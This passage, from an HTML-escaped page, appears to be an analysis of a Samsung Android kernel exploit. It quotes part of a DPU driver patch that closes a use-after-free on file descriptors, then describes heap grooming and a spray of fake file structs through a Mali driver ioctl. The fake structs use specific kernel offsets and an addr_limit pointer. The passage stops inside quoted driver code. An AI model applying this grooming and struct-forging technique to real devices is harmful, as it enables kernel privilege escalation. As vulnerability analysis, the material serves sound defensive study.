vdnyYxSRCi-c15\"&gt;remaining_frame&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;update_regs_list_cnt&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;extra&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;remained_frames &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;atomic_read&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;remaining_frame&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mutex_unlock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kthread_queue_work&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;worker&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;work&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* The code is moved here because the DPU driver may get a wrong fd&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* through the released file pointer,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* if the user(HWC) closes the fd and releases the file pointer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Since the user land can use fd from this point/time,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* it can be guaranteed to use an unreleased file pointer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* when creating a rel_fence in decon_create_release_fences(...)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c15\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c15\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;num_of_window&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fd_install&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;retire_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;&amp;nbsp;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c15\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c15\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mutex_unlock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.3x34vnbxlb65\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Heap Grooming and Spray&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;To groom the heap the exploit first opens and closes 30,000+ files using &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;memfd_create&lt;/span&gt;&lt;span&gt;. Then, the exploit sprays the &lt;/span&gt;&lt;span&gt;heap&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;with fake file structs. On this version of the Samsung kernel, the file struct is 0x140 bytes. In these new, fake file structs, the exploit sets four of the members:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.a0f322910268bcdf319b3b8a5c5329726f92499f\"&gt;&lt;/a&gt;&lt;a id=\"t.21\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fake_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;f_u &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x1010101&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fake_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;f_op &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kaddr &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x2071B0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;+&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x1094E80&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fake_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;f_count &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0x7F&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fake_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;private_data &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;addr_limit_ptr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;f_op&lt;/span&gt;&lt;span&gt;&amp;nbsp;member is set to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd_op&lt;/span&gt;&lt;span&gt;&amp;nbsp;for reasons we&lt;/span&gt;&lt;span&gt;&amp;nbsp;will cover below in the &amp;ldquo;Overwriting the addr_limit&amp;rdquo; section. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kaddr&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the address leaked using vulnerability #2 described previously. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit_ptr&lt;/span&gt;&lt;span&gt;&amp;nbsp;was calculated by adding 8 to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;task_struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;address also leaked using vulnerability #2.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit sprays 25 of these structs across the &lt;/span&gt;&lt;span&gt;heap&lt;/span&gt;&lt;span&gt;&amp;nbsp;using the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;MEM_PROFILE_ADD&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;ioctl in the Mali driver. &lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f09c2146baf213427f9b780c78be6f03204fa8b6\"&gt;&lt;/a&gt;&lt;a id=\"t.22\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/**&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* struct kbase_ioctl_mem_profile_add - Provide profiling information to kernel&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @buffer: Pointer to the information&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @len: Length&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @padding: Padding&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* The data provided is accessible through a debugfs file&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_ioctl_mem_profile_add &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __u64 buffer&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __u32 len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __u32 padding&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#define&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KBASE_ioctl_MEM_PROFILE_ADD &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; _IOW&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;KBASE_ioctl_TYPE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;27&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_ioctl_mem_profile_add&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;static&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_api_mem_profile_add&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_context &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_ioctl_mem_profile_add &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;len &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KBASE_MEM_PROFILE_MAX_BUF_SIZE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dev_err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kbdev&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dev&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;mem_profile_add: buffer too big\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EINVAL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; 